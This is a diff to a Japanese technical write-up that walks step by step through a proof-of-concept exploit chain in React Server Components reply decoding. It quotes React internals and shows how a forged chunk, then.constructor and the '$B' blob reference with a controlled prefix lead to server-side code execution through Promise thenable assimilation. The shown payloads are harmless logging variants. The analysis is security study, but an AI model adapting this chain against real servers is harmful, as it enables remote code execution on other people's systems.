@@ -341,7 +341,7 @@ generatedFunction(resolve2, reject2)         // 2回目の攻撃的 assimilation
 
 PoC を注入した直後、React runtime が扱う主要な値は概念的に次のようになる。
 
-```text
+```js
 realResponse = {
   _prefix: "",
   _formData: FormData {
@@ -364,7 +364,7 @@ rootChunk0 (初期) = {
 
 そして第1段階の revive が終わると、`rootChunk0.value` は概念的に次の forged chunk になる。
 
-```text
+```js
 forgedChunk = {
   status: "resolved_model",
   reason: 0,
@@ -381,7 +381,7 @@ forgedChunk = {
 
 さらに第3段階の revive が終わると、`forgedChunk.value` は次になる。
 
-```text
+```js
 forgedChunk.value = {
   then: generatedFunction
 }
@@ -421,9 +421,28 @@ function decodeReplyFromBusboy(busboyStream, webpackMap, options) {
 }
 ```
 
+この段階で実際に root chunk `0` が返ることは、`getRoot` と `getChunk` を合わせて読むとさらに明確である。
+
+```js
+export function getRoot(response) {
+  const chunk = getChunk(response, 0);
+  return chunk;
+}
+
+function getChunk(response, id) {
+  const backingEntry = response._formData.get(response._prefix + id);
+  if (backingEntry != null) {
+    chunk = createResolvedModelChunk(response, backingEntry, id);
+  } else {
+    chunk = createPendingChunk(response);
+  }
+  return chunk;
+}
+```
+
 この段階で見えている値は次のように整理できる。
 
-```text
+```js
 response._prefix = ""
 response._formData = backing FormData
 response._chunks = new Map()
@@ -439,6 +458,30 @@ getRoot(response)
 
 field `0` が到着すると、`resolveField(response, "0", payload0)` から `initializeModelChunk(rootChunk0)` へ進む。
 
+この流れをコードで見ると、まず Busboy の `field` event が `resolveField` を呼び、そこから `resolveModelChunk` が root chunk `0` を `resolved_model` に進める。
+
+```js
+export function resolveField(response, key, value) {
+  response._formData.append(key, value);
+  const id = +key.slice(response._prefix.length);
+  const chunk = response._chunks.get(id);
+  if (chunk) {
+    resolveModelChunk(chunk, value, id);
+  }
+}
+
+function resolveModelChunk(chunk, value, id) {
+  const resolvedChunk = chunk;
+  resolvedChunk.status = RESOLVED_MODEL;
+  resolvedChunk.value = value;
+  resolvedChunk.reason = id;
+  if (resolveListeners !== null) {
+    initializeModelChunk(resolvedChunk);
+    wakeChunkIfInitialized(chunk, resolveListeners, rejectListeners);
+  }
+}
+```
+
 呼び出しの骨格は次のとおりである。
 
 ```text
@@ -451,6 +494,23 @@ initializeModelChunk(rootChunk0)
 JSON.parse(rootChunk0.value)
   ↓
 reviveModel(realResponse, ...)
+```
+
+そして `initializeModelChunk` 本体では、`chunk.value` を `JSON.parse` し、その結果を `reviveModel(chunk._response, ...)` に渡している。
+
+```js
+function initializeModelChunk(chunk) {
+  const rawModel = JSON.parse(chunk.value);
+  const value = reviveModel(
+    chunk._response,
+    {'': rawModel},
+    '',
+    rawModel,
+    rootReference,
+  );
+  initializedChunk.status = INITIALIZED;
+  initializedChunk.value = value;
+}
 ```
 
 今回の PoC で特に重要なプロパティは 4 つある。
@@ -484,11 +544,27 @@ field 1
   -> Function
 ```
 
+この property path 解決自体は、`getOutlinedModel` の次のループで行われる。
+
+```js
+function getOutlinedModel(response, reference, parentObject, key, map) {
+  const path = reference.split(':');
+  const chunk = getChunk(response, parseInt(path[0], 16));
+  if (chunk.status === INITIALIZED) {
+    let value = chunk.value;
+    for (let i = 1; i < path.length; i++) {
+      value = value[path[i]];
+    }
+    return map(response, value);
+  }
+}
+```
+
 ここで大事なのは、今回の簡略 PoC では `__proto__` や `constructor:constructor` を経由しなくても、`rawRootChunk.then.constructor` だけで `Function` に届いている点である。`Chunk.prototype.then` は関数なので、その `constructor` は `Function` になる。
 
 第1段階が終わった時点の `rootChunk0.value` は、概念的には次の forged chunk になる。
 
-```text
+```js
 rootChunk0.value = forgedChunk = {
   status: "resolved_model",
   reason: 0,
@@ -523,7 +599,7 @@ Chunk.prototype.then.call(forgedChunk, resolve1, reject1)
 
 `forgedChunk.then` の実体は、第1段階で埋め込まれた `Chunk.prototype.then` である。ここでの `this` は本物の `Chunk` instance ではなく plain object だが、`status`, `value`, `reason`, `_response` が揃っているため、実装はそのまま進んでしまう。
 
-Relevant な骨格は次のとおりである。
+Relevant な骨格は次のとおりであり、ここで `this` が forged chunk にすり替わるのが重要である。
 
 ```js
 Chunk.prototype.then = function (resolve, reject) {
@@ -541,7 +617,14 @@ Chunk.prototype.then = function (resolve, reject) {
 };
 ```
 
-したがって、第2段階で起きていることは「borrowed `then` が forged chunk を 2 回目の revive に送り込むこと」であり、まだ generated function 本体は実行されない。
+つまり第2段階のコード上の実態は、次の 2 行に要約できる。
+
+```ts
+if (chunk.status === RESOLVED_MODEL) initializeModelChunk(chunk)
+if (chunk.status === INITIALIZED) resolve(chunk.value)
+```
+
+したがって、第2段階で起きていることは「borrowed `then` が forged chunk を 2 回目の revive に送り込み、終わったらその `value` を Promise 側へ返すこと」であり、まだ generated function 本体は実行されない。
 
 # 第3段階: forged `_response` の下で `"$B"` が generated function を返す
 
@@ -556,9 +639,15 @@ Chunk.prototype.then = function (resolve, reject) {
 
 2回目の revive では `value = "{\"then\":\"$B\"}"` が JSON.parse され、`parseModelString("$B")` が動く。
 
-React の実装は次の形である。
+`parseModelString` で今回直接効いている分岐は、`"$@"` と `"$B"` の 2 つである。
 
 ```js
+case '@': {
+  const id = parseInt(value.slice(2), 16);
+  const chunk = getChunk(response, id);
+  return chunk;
+}
+
 case 'B': {
   const id = parseInt(value.slice(2), 16);
   const blobKey = response._prefix + id;
@@ -567,9 +656,11 @@ case 'B': {
 }
 ```
 
+今回の簡略 PoC では、第1段階では `"$@0"` により raw chunk `0` を取り出し、第3段階では `"$B"` により forged `_formData.get(...)` の戻り値を取り出している。
+
 今回 `value` は `"$B"` なので、各値は次のようになる。
 
-```text
+```ts
 value.slice(2) = ""
 parseInt("", 16) = NaN
 blobKey = response._prefix + NaN
@@ -584,6 +675,18 @@ backingEntry = Function(response._prefix + "NaN")
 ```
 
 この戻り値は即実行ではない。`Function(...)` の戻り値は generated function であり、ここで得られるのは「あとで `then` として呼ばれる関数」である。
+
+このことは、2回目の `initializeModelChunk` が終わった直後の値を次のように読むと分かりやすい。
+
+```js
+入力:
+  forgedChunk.value = "{\"then\":\"$B\"}"
+
+revive 後:
+  forgedChunk.value = {
+    then: Function(forgedChunk._response._prefix + "NaN")
+  }
+```
 
 今回の PoC で `//` が入っている理由もここで説明できる。たとえば harmless 版の `_prefix` が次であれば、
 
@@ -601,7 +704,7 @@ console.log("[original-shape-safe-log]", JSON.stringify({...}))//NaN
 
 この段階の成果は、次の object が得られることだ。
 
-```text
+```js
 forgedChunk.value = {
   then: generatedFunction
 }
@@ -612,6 +715,16 @@ forgedChunk.value = {
 # 第4段階: generated function が `then(resolve, reject)` として呼ばれる
 
 `Chunk.prototype.then.call(forgedChunk, ...)` は、第3段階の revive が終わると `resolve1(forgedChunk.value)` を呼ぶ。しかし `forgedChunk.value` は `then` を持つ object なので、Promise 解決処理はもう一度 thenable assimilation を行う。
+
+React 側コードとして見える最後の地点は、第2段階でも抜粋したこの行である。
+
+```js
+case INITIALIZED:
+  resolve(chunk.value);
+  break;
+```
+
+この `resolve(chunk.value)` に `{ then: generatedFunction }` が渡るため、ここから先は JavaScript の Promise 解決ルールにより `generatedFunction(resolve2, reject2)` が呼ばれる。
 
 ```text
 resolve1({ then: generatedFunction })
@@ -640,6 +753,8 @@ arguments[0](["trace-original-poc","from-safe-prefix"])//NaN
 ```
 
 前者ならサーバログが出る。後者なら `arguments[0]`、つまり `resolve2` が呼ばれ、最終的に Server Action 側へ harmless な値が渡る。
+
+したがって、第4段階は「React が直接 `generatedFunction(...)` を呼ぶ段階」というより、「React が `resolve(chunk.value)` を返した結果、JS 標準の thenable assimilation が generated function を呼ぶ段階」と言った方が正確である。
 
 したがって、今回の簡略 PoC でも結論は同じである。
 
